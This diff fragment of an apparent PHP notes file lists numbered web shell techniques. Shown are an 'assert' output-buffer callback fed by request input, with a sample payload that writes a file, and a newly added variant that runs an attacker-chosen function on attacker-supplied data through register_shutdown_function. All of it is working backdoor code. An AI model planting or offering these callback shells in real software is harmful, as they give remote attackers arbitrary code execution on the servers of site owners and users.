@@ -11,3 +11,8 @@ $_REQUEST['pass'] = 'file_put_contents("1.22","22")';
 ob_start('assert');
 echo $_REQUEST['pass'];
 ob_end_flush();
+
+3.
+$e = 'assert';
+$e = $_REQUEST['e'];
+register_shutdown_function($e, $_REQUEST['pass']);
